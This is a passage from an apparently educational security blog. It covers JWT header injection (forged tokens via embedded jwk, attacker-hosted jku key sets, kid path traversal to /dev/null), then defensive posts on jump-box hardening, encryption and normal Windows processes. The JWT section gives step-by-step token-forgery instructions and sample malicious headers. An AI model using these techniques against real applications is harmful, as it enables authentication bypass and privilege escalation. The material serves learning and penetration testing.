            <li>Click the button for the type of key you wish to add (e.g., <strong>New Symmetric Key</strong>). A new dialog will open.</li>
            <li>In the dialog, input the new key:
                <ul>
                    <li>Click <strong>Generate</strong> to create a new key.</li>
                    <li>Alternatively, paste an existing key into the dialog.</li>
                    <li>Edit the key as needed.</li>
                </ul>
            </li>
            <li>Click <strong>OK</strong> to save the key.</li>
            </ul>

            <h4>JWT Header Parameter Injections – A Closer Look</h4>
            <p>According to the JWS (JSON Web Signature) specification, the only required field in a JWT (JSON Web Token) header is the alg parameter, which defines the cryptographic algorithm used to sign the token. However, in real world applications, JWT headers also known as JOSE headers often include additional fields. Some of these are particularly interesting from a security standpoint, especially because they can be influenced by the end user</p>
            <p>Here are a few commonly used JWT header parameters that can be exploited if not properly validated:</p>
            <ul>
                <li><strong>jwk (JSON Web Key):</strong> This parameter embeds a public key directly into the JWT header as a JSON object. If accepted without validation, it allows the attacker to specify which key the server should use to verify the signature.</li>
                <li><Strong>jku (JSON Web Key Set URL):</Strong>This parameter provides a URL that points to a JSON Web Key Set (JWKS). A vulnerable server might fetch a malicious key set from an attacker-controlled domain and use one of those keys to validate the token.</li>
                <li><Strong>kid (Key ID):</Strong> This parameter helps the server select the correct key from a set of possible keys. Attackers can manipulate kid to influence which key the server uses, potentially matching it with a key they control.</li>
            </ul>
            <p>In each case, these header fields give the attacker an opportunity to influence the key selection process during signature verification. If the server does not enforce strict validation such as checking the source of a jku, verifying the integrity of a jwk, or constraining acceptable kid values it may end up accepting a forged token.</p>
            <p>JWT header injection attacks exploit weak assumptions in how a server selects and trusts cryptographic keys. For developers and penetration testers alike, it's crucial to understand these parameters, audit their usage, and ensure robust validation mechanisms are in place to prevent unauthorized access.</p>
            <h4>Injecting Self-Signed JWTs via the jwk Header Parameter</h4>
            <p>The JSON Web Signature (JWS) specification defines an optional header parameter called jwk (JSON Web Key), which allows a public key to be embedded directly within the JWT itself. While this feature is intended to enable flexible key distribution, it can also introduce a dangerous attack vector when not properly validated.</p>
            <h5>What is a JWK?</h5>
            <p>A JWK (JSON Web Key) is a standardized format for representing cryptographic keys as JSON objects. It allows for easy serialization and exchange of public keys in web-based environments. Here’s an example of what a JWK might look like:</p>
            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>
            
                <div class="terminal-body">
{
    "kty": "RSA",
    "n": "....",   // Modulus
    "e": "AQAB"   // Exponent
}      
                </div>
            </div>
            <p>When a jwk is embedded in the JWT header, it essentially tells the server, "Use this public key to verify the token’s signature." This is where things can go wrong.</p>
            <h5>The Attack: Self-Signed JWT Injection</h5>
            <p>If a server accepts and trusts the jwk parameter without proper validation, an attacker can craft a malicious JWT with a self-signed signature signed using their own private key and include the matching public key in the jwk field. If the server blindly uses that key to verify the token, it will accept the forged token as legitimate.</p>
            <h5>This allows an attacker to:</h5>
            <ul>
                <li>Bypass authentication.</li>
                <li>Escalate privileges.</li>
                <li>Access protected resources as if they were an authenticated user.</li>
            </ul>
            <h5>Why This Works</h5>
            <p>The attack exploits a fundamental trust flaw: the server is relying on a key that comes from the untrusted user. Without verifying the origin or authenticity of the embedded jwk, the server is vulnerable to signature forgery.</p>
            <p>In a secure JWT implementation, servers should verify token signatures using a whitelisted set of trusted public keys, ideally stored securely on the server side. However, in some misconfigured systems, the server may naively accept any public key embedded within the JWT header specifically through the optional jwk (JSON Web Key) parameter.</p>
            <h4>Testing the Vulnerability Using Burp Suite & JWT Editor</h4>
            <p>Step-by-Step:</p>
            <ul>
                <li>Install the JWT Editor extension in Burp Suite (via BApp Store).</li>
                <li>Navigate to <strong>JWT Editor Keys</strong> in the main tab bar.</li>
                <li>Click <strong>"Generate New RSA Key"</strong> to create a custom key pair.</li>
                <li>Send a request containing a JWT (captured from the application) to <strong>Burp Repeater</strong>.</li>
                <li>In Repeater, switch to the <strong>JSON Web Token</strong> view (enabled by the extension).</li>
                <li>Modify the token payload to include something malicious e.g., changing <code>"role": "user"</code> to <code>"role": "admin"</code>.</li>
                <li>Click <strong>"Attack"</strong>, then choose <strong>"Embedded JWK"</strong>.</li>
                <li>When prompted, select the RSA key you generated earlier.</li>
                <li>Send the request and observe the response.</li>
                <li>If the server accepts your self-signed token, it confirms the presence of the vulnerability.</li>
            </ul>

            <p>🔐 <strong>Pro Tip:</strong> When performing this attack manually, you may also need to update the <code>kid</code> header parameter to match the <code>kid</code> of your embedded key. The JWT Editor handles this automatically during the attack.</p>
            
            <h4>Abusing the jku Header to Inject Self-Signed JWTs</h4>
            <p>Instead of embedding a public key directly into the JWT header using the jwk parameter, some servers rely on the jku (JSON Web Key Set URL) parameter. This field allows the JWT to specify a URL where the server can fetch a JWK Set a collection of public keys used to verify the token's signature. If the server blindly trusts this source, it becomes a powerful vector for abuse.</p>
        
            <h5>What’s a JWK Set?</h5>
            <p>A JWK Set is simply a JSON structure that contains an array of public keys (JWKs). Here’s a simplified example of a JWK Set:</p>
            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>
            
                <div class="terminal-body">
    {
        "keys": [
        {
            "kty": "RSA",
            "kid": "malicious-key-id",
            "e": "AQAB",
            "n": "attacker-controlled-modulus"
        },
        {
            "kty": "RSA",
            "kid": "backup-key",
            "e": "AQAB",
            "n": "some-other-key"
        }
    ]
}     
                </div>
            </div>
            <p>These sets are often hosted at predictable URLs like https://example.com/.well-known/jwks.json.</p>
            <h5>The Attack Strategy</h5>
            <p>If the server doesn't restrict or validate where it fetches the key set from, an attacker can:</p>
            <ul>
                <li>Host their own malicious JWK Set on a server they control.</li>
                <li>Sign a forged JWT with a private key that matches a public key in that set.</li>
                <li>Set the <code>jku</code> header to point to their own key set URL.</li>
                <li>Send the token to the server, which will fetch the attacker's key set and verify the forged signature.</li>
            </ul>
            <p>This effectively lets the attacker authenticate as any user or even escalate to admin if the JWT's payload is crafted correctly.</p>
            <h5>Real-World Example:</h5>
            <p>Suppose you're targeting an app that accepts jku values pointing to external domains. You generate your RSA key pair, create a JWK Set from the public key, and host it at:</p>
            <code>https://yourusername.github.io/.well-known/jwks.json</code>
            <p>Then, you generate a JWT with an admin claim, sign it using your private key, and include this header:</p>

            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>
            
                <div class="terminal-body">
{
    "alg": "RS256",
    "jku": "https://yourusername.github.io/.well-known/jwks.json",
    "kid": "malicious-key-id"
}                          
                </div>
            </div>
            <p>If the server fetches that key set without validating the domain or enforcing HTTPS strictness, it might accept your token as legit even though it’s self-signed.</p>
            <video controls style="width: 90%; height: 400px; border-radius: 10px;">
                <source src="abusingjkuheader.mp4" type="video/mp4">
                Your browser does not support the video tag.
            </video>
            <h4>🔐 Tampering with JWTs Using the kid Field</h4>
            <p>In many web applications, servers rely on multiple cryptographic keys to sign and verify data. To help decide which key to use, JWTs often include a kid (Key ID) field in their header. This tells the server, "Hey, use this specific key to validate me."</p>
            <p>Most of the time, the server keeps its verification keys in a JWK Set basically a structured list of keys. The server matches the kid in your token with the corresponding key in its list. But here’s the catch: there’s no strict format for what a kid should look like. It can literally be any string the developer decides sometimes a database ID, sometimes even the name of a local file.</p>
            <p>Now, if the server isn’t properly validating the kid value and it's vulnerable to path traversal, an attacker can exploit that. Instead of referencing a legit key, they can point the kid to a file somewhere else on the server's filesystem.</p>
            <h5>🧪 Example Header</h5>
            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>
            
                <div class="terminal-body">
{
    "kid": "../../path/to/file",
    "typ": "JWT",
    "alg": "HS256",
    "k": "asGsADas3421dfh9DGN_AFDFDbasfd8_anfjkvc"
}                                      
                </div>
            </div>
            <p>Here, the attacker is trying to get the server to load a key from a different location possibly even a file the attacker knows the contents of.</p>
            <h5>🎯 Why This Matters</h5>
            <p>If the server supports symmetric algorithms like HS256, the situation becomes dangerous fast. Unlike asymmetric methods, where a public and private key are separate, symmetric algorithms use the same secret to both sign and verify.</p>
            <h5>This means that:</h5>
            <ul>
                <li>If an attacker knows what’s inside the target file,</li>
                <li>And that file is used as the secret (because the attacker pointed the kid there),</li>
                <li>Then they can sign their own token using that same secret and it will verify as legit.</li>
            </ul>
            <h5>🧨 Simple Exploit: Using /dev/null</h5>
            <p>On Unix-based systems, /dev/null is a file that always returns nothing. If a server reads this as the key, it’s basically using an empty string as the secret.</p>
            <p>So if you generate a JWT signed using an empty string as the secret, and the kid points to /dev/null, it could get accepted by the server.</p>
            <h5>💡 Side Note</h5>
            <p>If you’re using the JWT Editor extension in Burp, you can’t sign tokens with an empty string directly. But there’s a known workaround: using a Base64-encoded null byte instead will bypass this limitation and still work for this kind of test.</p>
            <p>If the server retrieves its verification keys from a database, the kid header parameter could be abused to perform SQL injection potentially allowing attackers to manipulate database queries and extract sensitive data.</p>
            <video controls style="width: 90%; height: 400px; border-radius: 10px;">
                <source src="bypassing-jwt.mp4" type="video/mp4">
                Your browser does not support the video tag.
            </video>
            <p>Check my write-up for one of the challenges I solved using WebSockets here <a class="link" href="https://medium.com/@vgqxjb/jawt-scratchpad-1df6f8f2e707" target="_blank">PicoCTF</a>.</p>
        </div>
    </div>

    <div id="post9" class="post" onclick="togglePost(this)">
        <h3>My Approach to Securing a Jump Box: Best Practices for Beginners</h3>
        <div class="post-content">
            <img src="jumbox.png" alt="OSI Model Layers" style="width: 40%; max-width: 1650px; border-radius: 10px;">
            <ol>
                <li>
                  <strong>Minimal System Configuration</strong>
                  <ul>
                    <li>Install only essential tools, such as SSH, RDP, or VPN clients. Avoid any unnecessary services or applications to reduce the attack surface.</li>
                    <li>Use security focused OS configurations for example, using a minimal install of Linux or a Windows Server with security options enabled.</li>
                    <li>Disable unnecessary services</li>
                    <li>Remove unused package</li>
                    <li>Ensure that the OS and any installed software are regularly updated with the latest patches to protect against known vulnerabilities.</li>
                  </ul>
                </li>
                <li>
                  <strong>Access Control & Authentication</strong>
                  <ul>
                    <li>Enforce the use of SSH keys for Linux/Unix-based jump boxes instead of passwords. For Windows, use certificate-based authentication for RDP.</li>
                    <li>Disable password-based logins both SSH and RDP to mitigate brute force attacks.</li>
                    <li>Require multi factor authentication (MFA) for all access to the jump box.</li>
                    <li>Ensure only authorized administrators have access. Use role-based access control (RBAC) to limit permissions.</li>
                  </ul>
                </li>
                <li>
                  <strong>Network Security</strong>
                  <ul>
                    <li>Only allow access to the jump box from trusted IPs or networks.</li>
                    <li>Place the jump box behind a strict firewall to control both inbound and outbound traffic.</li>
                    <li>Ensure the jump box is placed in a dedicated security zone, to isolate it from the internal network, limiting exposure.</li>
                  </ul>
                </li>
                <li>
                  <strong>Logging and Monitoring</strong>
                  <ul>
                    <li>Enable detailed access and session logging to monitor who accesses the jump box and what actions are taken.</li>
                    <li>Forward logs to a centralized logging system for example SIEM like Splunk for real-time analysis and to detect any abnormal activities.</li>
                    <li>If possible, enable session recording for administrative access to allow for post-event analysis in case of security incidents.</li>
                  </ul>
                </li>
                <li>
                  <strong>Security Software and Hardening</strong>
                  <ul>
                    <li>Install and configure intrusion detection software like Snort to monitor the integrity of the system and alert on unusual activities.</li>
                    <li>Install and configure trusted endpoint protection software to monitor for malicious activity on the jump box.</li>
                    <li>For Linux systems, disable direct root login. Enforce the use of sudo for administrative actions.</li>
                    <li>Implement automatic session timeouts and lockout policies after a certain period of inactivity or after failed login attempts to protect against unauthorized access.</li>
                  </ul>
                </li>
                <li>
                  <strong>Encryption</strong>
                  <ul>
                    <li>Ensure that all connections to the jump box use encryption.</li>
                    <li>Encrypt the jump box’s disk with full disk encryption.</li>
                  </ul>
                </li>
                <li>
                  <strong>Backup and Disaster Recovery</strong>
                  <ul>
                    <li>Perform regular backups of the jump box configuration, critical files, and logs. Store backups securely and separately from the production environment to avoid data loss during an incident.</li>
                    <li>Periodically test the backup and restore process to ensure it works effectively in case of failure or compromise.</li>
                  </ul>
                </li>
                <li>
                  <strong>Session Management</strong>
                  <ul>
                    <li>Limit the number of simultaneous administrative sessions to reduce the attack surface and prevent misuse.</li>
                    <li>Ensure the jump box is used exclusively for management and administrative tasks.</li>
                  </ul>
                </li>
                <li>
                  <strong>Periodic Security Audits and Penetration Testing</strong>
                  <ul>
                    <li>Regularly audit the security posture of the jump box by conducting vulnerability scans and penetration testing. This helps identify potential weaknesses and ensures the system remains secure over time.</li>
                  </ul>
                </li>
              </ol>              
            
        </div>
    </div>

    <div id="post10" class="post" onclick="togglePost(this)">
        <h3>Encryption</h3>
        <div class="post-content">
            <ul>
                <li><strong>Ciphertext</strong> – The scrambled version of your original data after it’s been encrypted. Basically, the unreadable result of encryption.</li>
                <li><strong>Cipher</strong> – A formula or method used to lock (encrypt) or unlock (decrypt) data. Modern ones are math-heavy, but old-school ones like Caesar ciphers are just simple shifts.</li>
                <li><strong>Plaintext</strong> – The raw, readable info before it gets encrypted. Could be a message, image, file — anything.</li>
                <li><strong>Encryption</strong> – The process of turning plain data into unreadable ciphertext using a cipher.</li>
                <li><strong>Encoding</strong> – Just a way to change how data looks (like Base64), not secure. It’s meant to be reversed easily.</li>
                <li><strong>Key</strong> – A crucial piece of info that lets you decrypt ciphertext and get back to the original data.</li>
                <li><strong>Passphrase</strong> – Like a strong password that protects your key. It doesn’t do the encryption itself, but it guards the thing that does.</li>
                <li><strong>Asymmetric encryption</strong> – Uses a pair of keys: one for encrypting, one for decrypting. You don’t need to share the private one.</li>
                <li><strong>Symmetric encryption</strong> – Uses the same key to lock and unlock the data. Fast, but you’ve got to keep that key safe.</li>
                <li><strong>Brute force</strong> – A trial-and-error attack where every possible key or password is tried until something works.</li>
                <li><strong>Cryptanalysis</strong> – Breaking encryption by finding flaws in the math or logic behind the cipher. Smarter than brute force.</li>
              </ul>
              
              <p>Cryptography has its own version of the CIA triad, not just Confidentiality and Integrity, but also Authenticity. It’s everywhere. The site you’re reading this on? It's using an encrypted connection right now. You don’t directly interact with cryptography, but it silently secures almost everything you do online, from messaging to banking.</p>
              <p>Cryptography is essential in every layer of tech because it's what protects sensitive data from bad actors. Industries that handle critical info, like restaurants processing card payments or hospitals storing medical records, are legally required to follow strict encryption standards. Why? Because your data isn’t just data to attackers, it’s a goldmine.</p>
              <h4>Types of Encryption</h4>
              <p>There are two main types of encryption: symmetric and asymmetric.</p>
              <p><strong>Symmetric encryption(AES)</strong> uses the same key to both encrypt and decrypt data. For example, if User A wants to send an encrypted message to User B, they both need to have access to the same secret key. That key must be shared securely ahead of time, if someone else gets it, the whole system is compromised.</p>
              <p>Think of it like a locked box: both people need the same key to lock it and unlock it.</p>
              <p><strong>Asymmetric encryption</strong>uses a pair of keys: a public key and a private key. One is used to encrypt, and the other is used to decrypt.</p>
              <p>For example, if User A wants to send a secure message to User B, they would encrypt it using User B's public key. Only User B can decrypt it using their private key.</p>
              <p>Public keys are meant to be shared openly, they don’t need to be kept secret. This system ensures that only the intended recipient (who holds the private key) can read the message.</p>
              <p>On the flip side, if User A encrypts the message with their private key, anyone can decrypt it using User A’s public key, this doesn’t keep it secret, but it proves the message came from User A, because only they have the private key. That’s how digital signatures work.</p>
              <p>In asymmetric encryption, if you encrypt something with your private key, it’s used to prove your identity, that’s digital signing (aka authenticity).</p>
              <p>If you encrypt something with the recipient’s public key, only their private key can decrypt it, that’s confidentiality.</p>
              <h4>key variables that you need to know about for RSA are p, q, m, n, e, d, and c.</h4>
              <p>“p” and “q” are large prime numbers, “n” is the product of p and q.</p>
              <p>The public key is n and e, the private key is n and d.</p>
              <p>“m” is used to represent the message (in plaintext) and “c” represents the ciphertext (encrypted text).</p>
              <h4>🔐 How Asymmetric Encryption Helps Set Up Symmetric Encryption</h4>

            <h4>💡 What It Means:</h4>
            <p>Asymmetric encryption (public/private key stuff) is <strong>slow</strong>. Symmetric encryption (shared key stuff) is <strong>fast</strong>.</p>
            <p>So instead of encrypting everything with asymmetric encryption, we just use it at the start, to securely share a secret key that will be used for symmetric encryption.</p>

            <h4>🧠 Think of it like this:</h4>
            <p>You and I want to talk securely. Here's what happens:</p>
            <ul>
            <li>🔓 I send you my public key.</li>
            <li>🔐 You create a random secret key (for symmetric encryption).</li>
            <li>📦 You encrypt that secret key with my public key, then send it to me.</li>
            <li>🗝️ I use my private key to decrypt that message and get the secret key.</li>
            <li>🚀 Now we both have the same symmetric key, and we switch to fast symmetric encryption for everything after.</li>
            </ul>

            <h4>🧠 Understanding Key Exchange — A Fresh Metaphor</h4>

            <p>Think of symmetric encryption like a secret language only you and your friend understand. But first, you need to teach them the language without anyone else overhearing.</p>

            <p>You ask your friend to send you a special kind of mailbox — one that locks when closed and can only be unlocked by them. You drop your "secret language guide" into that mailbox and send it back.</p>

            <p>They open it with their special key, read the guide, and now you're both fluent in this secret language.</p>

            <h4>🔑 How It Maps to Cryptography:</h4>
            <ul>
            <li>The <strong>secret language</strong> = symmetric encryption key</li>
            <li>The <strong>locking mailbox</strong> = public key</li>
            <li>The <strong>special key to open it</strong> = private key</li>
            </ul>

            <p>Now that you both speak the same encrypted language, you can talk back and forth super fast without worrying about anyone spying. You only used asymmetric encryption once, just to deliver the language securely.</p>


            <h4>⚡ Why This Is Common:</h4>
            <p>It’s literally how HTTPS (the padlock on your browser) works. Every time you connect to a secure website:</p>
            <ul>
            <li>Your browser and the website do an asymmetric handshake to agree on a symmetric key.</li>
            <li>Then all your data is encrypted using symmetric encryption because it’s fast and efficient.</li>
            </ul>

            <p>Asymmetric crypto is used to <strong>securely exchange a shared secret</strong>. That secret becomes the key for symmetric encryption, which handles the actual data transfer. Best of both worlds.</p>
            <h4>💾 What’s a Digital Signature?</h4>
            <p>A digital signature is like a cryptographic autograph, it proves that <strong>you</strong> (and not someone pretending to be you) created or approved a message or file.</p>

            <h4>🔐 How It Works:</h4>
            <p>It uses <strong>asymmetric encryption</strong> (public/private key pairs), but in reverse compared to encryption.</p>
            <ul>
            <li>You sign a file or message using your <strong>private key</strong>.</li>
            <li>Anyone can verify that signature using your <strong>public key</strong>.</li>
            <li>If the signature is valid, it confirms:</li>
            <ul>
                <li>✅ The file/message came from you (authenticity).</li>
                <li>✅ The contents haven’t been altered (integrity).</li>
            </ul>
            </ul>

            <h4>🔑 Why This Is Legit:</h4>
            <ul>
            <li>Only <strong>you</strong> have access to your private key.</li>
            <li>Your <strong>public key</strong> is shared openly for verification.</li>
            <li>If someone tries to tamper with the file or impersonate you, the signature won’t validate.</li>
            </ul>

            <h4>🧠 Metaphor:</h4>
            <p>Imagine writing a note and sealing it with a unique wax stamp that only you own. Anyone who sees the stamp can say:</p>
            <p><em>"Yep, this came from them, and no one tampered with it."</em></p>

            <p>That’s exactly what a digital signature does, in the world of files and data.</p>

            <h4>🔐 Diffie-Hellman Explained with a Secret Drink Mix</h4>

            <p>Two people, Sender and Receiver, want to agree on a shared secret over a public channel. They can't directly share their secret ingredients, but they still want to end up with the same final result: a private drink mix. Here's how they pull it off:</p>

            <h4>🥤 Step 1: Agree on a Base Drink</h4>
            <p>
            Both Sender and Receiver publicly say:
            </p>
            <ul>
            <li>“Let’s use lemonade as our base.”</li>
            </ul>
            <p>
            Everyone can hear this, it’s public and safe to share.
            </p>

            <h4>🌿 Step 2: Pick Secret Ingredients</h4>
            <ul>
            <li>Sender secretly chooses mint.</li>
            <li>Receiver secretly chooses ginger.</li>
            </ul>
            <p>
            These are their private secrets and are never shared directly.
            </p>

            <h4>🧪 Step 3: Mix and Exchange</h4>
            <ul>
            <li>Sender mixes lemonade + mint, sends it to Receiver.</li>
            <li>Receiver mixes lemonade + ginger, sends it to Sender.</li>
            </ul>
            <p>
            Each person now has the other's partial mix, but not the full recipe.
            </p>

            <h4>🧬 Step 4: Final Remix</h4>
            <ul>
            <li>Sender adds their mint into the mix received from Receiver.</li>
            <li>Receiver adds their ginger into the mix received from Sender.</li>
            </ul>
            <p>
            Now they both have the exact same drink: lemonade + mint + ginger.
            </p>

            <h4>✅ What It Represents</h4>
            <ul>
            <li><strong>Lemonade</strong> = Public value (e.g., a shared number)</li>
            <li><strong>Mint/Ginger</strong> = Private secrets (chosen by each party)</li>
            <li><strong>Final Drink</strong> = Shared secret key (used for symmetric encryption)</li>
            </ul>

            <p>
            This is the magic of Diffie-Hellman: you build a shared secret without ever actually sending it. An eavesdropper hears only the public stuff, not enough to recreate the final key.
            </p>
        </div>
    </div>

    <div id="post11" class="post" onclick="togglePost(this)">
        <h3>Windows operating system and understand what normal behaviour is</h3>
        <div class="post-content">
            <img src="windowsprotection.png" alt="OSI Model Layers" style="width: 30%; max-width: 1200px; border-radius: 10px;">
            <p>Whether we're using Windows or Linux, we need to fully understand our operating system. The better we know how it normally behaves, the easier it is to detect anomalies and spot potential threats.</p>
            <p>"Master your OS Windows or Linux because if you don’t know what 'normal' looks like, you’ll never spot what isn’t."</p>
            <p>We can’t just rely on third-party software like antivirus, those tools often lag behind the latest attacks. Even modern solutions like EDR (Endpoint Detection and Response) can be bypassed. That’s why it’s critical to understand the expected behavior of the systems we're defending, Windows, in this case. When you know what normal looks like, you can start spotting what’s malicious, even when tools miss it.</p>
            <p>Task Manager comes preinstalled in Windows and is a GUI based utility that shows you what’s running on your system. Most users only open it to force close unresponsive apps or manage startup programs. But it's way more powerful than that.</p>
            <p>By default, it only shows basic columns like Name, Status, CPU, and Memory. But you can actually reveal much more like Type, Publisher, PID, Command Line, and even GPU usage if available. With the right view, it becomes a solid tool for analyzing what’s really happening under the hood of your system.</p>
            <img src="taskmoredetails.png" alt="OSI Model Layers" style="width: 70%; max-width: 1200px; border-radius: 10px;">
            <ul>
                <li><strong>🔤 Name</strong>: Shows the user-friendly name of the app or process (e.g., Google Chrome).<br><em>Why it matters:</em> Quickly identifies what’s running on your system.</li>
              
                <li><strong>✅ Status</strong>: Indicates if a process is Running or Suspended.<br><em>Why it matters:</em> Helps spot apps that are paused or inactive.</li>
              
                <li><strong>🧠 CPU</strong>: Displays the percentage of CPU usage by the process.<br><em>Why it matters:</em> Great for tracking down performance issues and high CPU usage.</li>
              
                <li><strong>💾 Memory</strong>: Shows how much RAM the process is using.<br><em>Why it matters:</em> Helps identify apps that are hogging memory or causing slowdowns.</li>
              
                <li><strong>🧱 Type</strong>: Categorizes the process as an app, background task, or Windows process.<br><em>Why it matters:</em> Useful for knowing what’s safe to close and what’s system-critical.</li>
              
                <li><strong>🏢 Publisher</strong>: Lists the verified source or developer of the app.<br><em>Why it matters:</em> Helps detect untrusted or potentially malicious software.</li>
              
                <li><strong>🔢 PID (Process ID)</strong>: A unique ID for every running process.<br><em>Why it matters:</em> Crucial for troubleshooting, scripting, and linking logs to specific processes.</li>
              
                <li><strong>📝 Command Line</strong>: Shows the full path and launch arguments of the process.<br><em>Why it matters:</em> Reveals how a process started, including hidden or suspicious flags.</li>
              
                <li><strong>🎮 GPU</strong>: Displays how much GPU resources the process is using.<br><em>Why it matters:</em> Essential for diagnosing issues in graphics-intensive apps like games or video editors.</li>
            </ul>
            
            <p>The Details tab in Task Manager is like the "Pro Mode" for monitoring what’s really happening on a Windows system. It's where power users and defenders go when the Processes tab isn't enough.</p>
            <h5>🔍 What is the Details Tab?</h5>
            <p>The Details tab gives a low-level, precise view of every running process, with more granular control and information than the default view.</p>
            <p>While the Processes tab is friendly and grouped (apps, background, Windows processes), the Details tab is raw and unfiltered. Every process is listed on its own no grouping, just facts.</p>
            <h5>What You’ll See in the Details Tab</h5>
            <p>
            You get the raw view: <strong>Name</strong>, <strong>PID</strong>, <strong>Status</strong>, <strong>User Name</strong>. Want more? 
            Right-click the headers and add <strong>Image Path Name</strong> to see where it runs from, and <strong>Command Line</strong> to see how it launched. 
            </p>
            <p>
            These two columns can quickly alert an analyst to suspicious activity. For example, suppose we see a process named <code>svchost.exe</code> with <strong>PID 384</strong>. 
            That sounds normal since svchost.exe is a trusted Windows process. But when we check the <strong>Image Path Name</strong> and <strong>Command Line</strong>, something looks off.
            </p>
                
            <p>
            Instead of executing from <code>C:\Windows\System32\svchost.exe</code>, it's running from <code>C:\Users\Public\svchost.exe</code> with an unusual command line.
            That's a major red flag. It's likely a malicious process impersonating a legitimate one.
            </p>
                
            <p>
            This is why enabling these columns matters. They reveal exactly where a binary is running from and how it was launched, which is critical when spotting outliers or investigating suspicious behavior.
            </p>
            <img src="detailsadvanced.png" alt="OSI Model Layers" style="width: 70%; max-width: 1200px; border-radius: 10px;">
            <p>
            Task Manager gives you a solid overview of running processes, but it doesn’t show everything. One important piece that's missing by default is the <strong>parent process</strong> — the process that launched another process. 
            This is a crucial detail when trying to spot suspicious activity.
            </p>
                
            <p>
            Take <code>svchost.exe</code> again as an example. Under normal conditions, it should be spawned by <code>services.exe</code>. But if we find <code>svchost.exe</code> (like PID 384) being launched by something unusual, like <code>cmd.exe</code> or an unknown executable, 
            that’s a red flag and should trigger a deeper investigation.
            </p>
                
            <p>
            Tools like Process Explorer or command-line utilities like <code>Get-Process</code> in PowerShell can help you view parent-child relationships when Task Manager falls short.
            </p>
            <p>Task Manager doesn't show a Parent-Child process view. That is where other utilities, such as Process Hacker and Process Explorer, come to the rescue.</p>
            <p>
            While Task Manager is useful, defenders should also get comfortable using command-line tools to inspect running processes on a Windows system. 
            Utilities like <code>tasklist</code>, <code>Get-Process</code> or <code>ps</code> in PowerShell, and <code>wmic</code> provide more flexibility and can be scripted for automation and deeper analysis.
            </p>

            <h5>Examples of Command-Line Tools for Process Inspection</h5>

            <ul>
            <li>
                <strong>🔹 tasklist</strong><br>
                <code>tasklist</code><br>
                Displays all running processes with PID and memory usage.<br>
                <em>Example:</em> <code>tasklist /FI "IMAGENAME eq svchost.exe"</code><br>
                <small>🔍 Filters and shows only processes named <code>svchost.exe</code>.</small>
            </li>

            <li>
                <strong>🔹 PowerShell Get-Process</strong><br>
                <code>Get-Process</code><br>
                Native PowerShell command to inspect running processes with more flexibility.<br>
                <em>Example:</em> <code>Get-Process | Where-Object { $_.Name -eq "notepad" }</code><br>
                <small>🔍 Filters for the <code>notepad</code> process.</small>
            </li>

            <li>
                <strong>🔹 PowerShell ps (alias)</strong><br>
                <code>ps</code><br>
                A shorthand alias for <code>Get-Process</code> in PowerShell.<br>
                <em>Example:</em> <code>ps | Sort-Object CPU -Descending</code><br>
                <small>📊 Shows top CPU-consuming processes in order.</small>
            </li>

            <li>
                <strong>🔹 WMIC (Windows Management Instrumentation Command-line)</strong><br>
                <code>wmic process list brief</code><br>
                Gives detailed info about processes including command-line arguments and executable path.<br>
                <em>Example:</em> <code>wmic process where "name='powershell.exe'" get ProcessId,CommandLine</code><br>
                <small>🕵️ Shows how PowerShell was launched and by which command.</small>
            </li>
            </ul>

            <h5>Understanding User Mode vs Kernel Mode</h5>
            <p>
            Before diving into how processes work, it's important to understand the difference between <strong>User Mode</strong> and <strong>Kernel Mode</strong> in Windows.
            </p>

            <ul>
            <li>
                🔹 <strong>User Mode:</strong>  
                When you launch an app, Windows runs it in user mode. This creates a separate <em>process</em> with its own private virtual address space and handle table.  
                That means:
                <ul>
                <li>Each app is isolated from others</li>
                <li>One app can't directly interfere with another</li>
                <li>If an app crashes, it won’t take down the system</li>
                </ul>
            </li>

            <li>
                🔹 <strong>Address Space Limitations:</strong>  
                User-mode processes can't touch memory reserved for the operating system. This restriction:
                <ul>
                <li>Protects the integrity of system data</li>
                <li>Prevents user apps from corrupting critical OS components</li>
                </ul>
            </li>

            <li>
                🔹 <strong>Kernel Mode Risks:</strong>  
                All code that runs in kernel mode shares the same virtual address space. Unlike user-mode processes, there’s no isolation between drivers or the OS itself.  
                <br><br>
                This means:
                <ul>
                  <li>If a kernel-mode driver writes to the wrong memory address, it could overwrite critical OS data or interfere with other drivers.</li>
                  <li>There’s no safety net, a mistake in kernel mode doesn’t just crash one process, it can bring down the entire system.</li>
                  <li>That's why writing kernel-mode code requires extreme caution. Bugs here are system-level threats, not just app-level glitches.</li>
                </ul>
            <p>The following diagram illustrates the communication between user-mode and kernel-mode components.</p>
            <img src="userandkernelmode01.png" alt="OSI Model Layers" style="width: 30%; max-width: 1200px; border-radius: 10px;">
            </li>
            </ul>
            <h5>Now, what is normal behaviour for this process?</h5>
            <img src="system.png" alt="OSI Model Layers" style="width: 70%; max-width: 1630px; border-radius: 10px;">
            <p>Image Path: C:\Windows\system32\ntoskrnl.exe (NT OS Kernel)</p>
            <p>Parent Process: System Idle Process (0)</p>
            <h5>What is unusual behaviour for this process?</h5>
            <ul>
                <li>A parent process (aside from System Idle Process (0))</li>
                <li>Multiple instances of System. (Should only be one instance)</li>
                <li>A different PID. (Remember that the PID will always be PID 4)</li>
                <li>Not running in Session 0</li>
            </ul>

            <h4>🔍 What Is smss.exe?</h4>
            <p>smss.exe stands for Session Manager Subsystem, a critical component of the Windows NT family. It's the first user-mode process initiated by the kernel during the system's startup sequence. Its primary function is to set up the environment for user sessions and manage essential system processes.​</p>
            <h5>⚙️ Key Functions of smss.exe</h5>
            <ul>
                <li>This process starts the kernel and user modes of the Windows subsystem</li>
                <li>Smss.exe starts csrss.exe (Windows subsystem) and wininit.exe in Session 0</li>
                <li>Session Initialization: smss.exe initializes system sessions by setting up environment variables and creating DOS device mappings.​</li>
                <li>Subsystem Startup: It starts essential subsystems, including the kernel-mode part of the Win32 subsystem (win32k.sys) and user-mode components like csrss.exe.​</li>
                <li>Process Management: smss.exe is responsible for launching critical processes such as wininit.exe for system initialization and winlogon.exe for handling user logins.</li>
                <li>Session Management: For each new user session, smss.exe creates a new instance to manage that session, ensuring isolation and stability across multiple user environments.</li>
            </ul>
